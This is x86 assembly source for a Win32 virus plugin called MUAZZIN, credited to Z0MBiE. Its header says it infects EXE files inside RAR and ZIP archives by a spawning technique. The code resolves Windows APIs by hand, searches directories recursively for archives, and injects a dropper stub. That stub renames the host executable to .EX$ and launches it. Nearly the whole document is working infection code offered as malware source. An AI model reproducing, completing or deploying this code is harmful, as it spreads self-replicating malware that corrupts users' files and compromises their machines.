;MUAZZIN - infect EXE in RAR/ZIP files, spawning tech
;RAR/ZIP LIB (c) Z0MBiE

;No run - Must processing...

.586p
.model   flat
locals __
jumps

by  equ byte ptr
wo  equ word ptr
dwo equ dword ptr
ofs equ offset

.xlist
include \inc\win32api.inc
include \inc\pe.inc
.list
include \muazzin\muazzin.asi

.data
       dd 12345678h

.code

_TYPE    = "zr_i"
_VERSION = 0101h

start:
       mov esi, [esp+4]
       test dwo [esi+m_why], MT_APP
       jz __query
       xchg edi, esi
       call delta
       mov eax, [edi+GPA]
       mov [esi+getpaddr], eax
       mov eax, [edi+GMH]
       mov [esi+getmhnd], eax
       pushad
       mov ecx, [edi+m_droppersize]
       mov [esi+dropper_size], ecx
       mov edi, [edi+m_dropper]
       call delta
       add esi, ofs buffer
       xchg esi, edi
       rep movsb
       call inject
       jc __fuck
       call get_apis
       call delta
       add esi, ofs callback
       push esi
       call busca_recursiva
       popad
  __fuck:
       mov dwo [esi+m_result], MR_DONE
  __done:
       ret 4
  __query:
       test dwo [esi+m_why], MT_QUERY
       jz __fuck
       mov esi, MT_QUERY+MT_APP
       mov ebx, _TYPE
       mov ecx, _VERSION
       mov eax, MR_DONE
       jmp __done

callback:
       pushad
       push 1000
       call delta
       call [esi+Sleep]
       mov edx, [esp+(8*4)+4]
       mov esi, edx
  __search0:
       lodsb
       test al, al
       jne __search0
       mov edi, esi
       mov ecx, 12345678h              ;ecx==dropper size
  dropper_size equ dwo $-4              ;edx==file name
       call delta
       add esi, ofs buffer              ;esi==dropper code

;       mov eax, [edi-9]
;       and eax, not 020202020h          ;DEBUG CODE!
;       cmp eax, "TSET"
;       jne __isnt

       mov eax, [edi-5]
       and eax, not 020202000h
       cmp eax, "RAR."
       jne __check_zip
       call process_rar
       push 1*60*1000
       call delta
       call [esi+Sleep]
       jmp __isnt
  __check_zip:
       cmp eax, "PIZ."
       jne __isnt
       call process_zip
       push 3*60*1000
       call delta
       call [esi+Sleep]
  __isnt:
       popad
       ret 4

delta:
       call __delta
  __delta:
       pop esi
       sub esi, ofs __delta
       ret

get_apis:
       call delta
       lea eax,[esi+krnl]
       push eax
       call [esi+getmhnd]
       mov ebp, eax
       push esi
       add esi, ofs GetDriveType
       mov edi, esi
  __next:
       lodsd
       test eax, eax
       jz __allgot
       mov edx, [esp]
       add eax, edx
       push eax
       push ebp
       call [edx+getpaddr]
       stosd
       jmp __next
  __allgot:
       pop eax
       ret

inject:
       call delta
       mov ecx, ofs i_end-ofs i_start
       add esi, ofs buffer
       add esi, [esi+3ch]
       add esi, SIZE IMAGE_NT_HEADERS
       mov eax, [esi.SIZE IMAGE_SECTION_HEADER.SH_PointerToRawData]
       mov edi, [esi.SH_SizeOfRawData]
       mov ebx, edi
       mov edx, edi
       mov ebp, [esi.SH_PointerToRawData]
       call delta
       add edi, ebp
       add esi, ofs buffer
       add ebp, esi
       sub eax, edi
       cmp eax, ecx
       jbe __error
  __inject:
       call delta
       add edi, esi
       add edi, ofs buffer
       add esi, ofs i_start
       rep movsb
       mov esi, ebp
  __loop:
       dec edx
       jz __error
       cmp dwo [esi], 12345678h
     org $-4
       push dwo [esp]
       push dwo [esp]
     org $-2
       je __found
  __noyet:
       lodsb
       jmp __loop
  __found:
       cmp wo [esi+4], 2434h
       jne __noyet
       mov edi, esi
       mov al, 12h
     org $-1
       push 12345678h
     org $-4
       stosb
       lea eax, [ebx+0401000h]
       stosd
       mov al, 12h
     org $-1
       ret
       stosb
  __fine:
       test al, ?
     org $-1
  __error:
       stc
       ret

i_start:
       call __1
krnl   db "KERNEL32.DLL",0
  __1:
       call [esp+8+4]                     ;GetModuleHandleA
       mov ebx, eax
       call __2
       db "GetCommandLineA",0
  __2:
       push ebx
       call __3
       db "WinExec",0
  __3:
       push ebx
       call __4
       db "ExitProcess",0
  __4:
       push ebx
       call [esp+12+24]                 ;GetProcAddress
       mov edi, eax
       call [esp+12+16]                 ;GetProcAddress
       mov ebp, eax
       call [esp+12+8]                  ;GetProcAddress
       call eax
       mov esi, eax
  __5:
       mov ebx, [esi]
       and ebx, not 20202000h
       cmp ebx, "EXE."
       je __6
       inc esi
       jmp __5
  __6:
       mov dwo [esi], "$XE."
       push eax
       call ebp
       push 0
       call edi
       ret
i_end:

include \muazzin\samples\search.asi
include \muazzin\samples\fioexlow.asi
include xcrc32.asi              ; crc32

include rarlib.asi              ; .rar archives management
include ziplib.asi              ; .zip archives management

getmhnd              dd 0
getpaddr             dd 0

GetDriveType         dd ofs api001
SetCurrentDirectoryA dd ofs api002
FindFirstFileA       dd ofs api003
FindNextFileA        dd ofs api004
FindClose            dd ofs api005
SetLastError         dd ofs api006
GetLastError         dd ofs api007
CreateFileA          dd ofs api008
CloseHandle          dd ofs api009
SetFilePointer       dd ofs api010
WriteFile            dd ofs api011
ReadFile             dd ofs api012
SetFileAttributesA   dd ofs api013
GetFileSize          dd ofs api014
Sleep                dd ofs api015
                     dd 0

api001 db "GetDriveTypeA", 0
api002 db "SetCurrentDirectoryA", 0
api003 db "FindFirstFileA", 0
api004 db "FindNextFileA", 0
api005 db "FindClose", 0
api006 db "SetLastError", 0
api007 db "GetLastError", 0
api008 db "CreateFileA", 0
api009 db "CloseHandle", 0
api010 db "SetFilePointer", 0
api011 db "WriteFile", 0
api012 db "ReadFile", 0
api013 db "SetFileAttributesA", 0
api014 db "GetFileSize", 0
api015 db "Sleep",0

buffer:

end    start
